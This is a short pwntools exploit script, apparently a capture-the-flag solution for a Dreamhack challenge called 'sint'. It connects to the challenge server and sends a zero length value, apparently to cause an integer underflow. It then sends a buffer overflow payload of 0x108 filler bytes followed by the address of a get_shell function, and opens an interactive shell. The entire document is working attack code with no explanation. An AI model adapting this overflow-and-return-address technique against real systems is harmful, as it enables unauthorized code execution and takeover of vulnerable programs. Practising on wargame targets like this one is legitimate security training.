from pwn import*

p = remote('host3.dreamhack.games', 12824)
#p = process('./sint')

payload = b"0"
p.sendline(payload)

get_shell = 0x08048659

payload = b"a"*0x108 + p32(get_shell)
p.sendline(payload)

p.interactive()
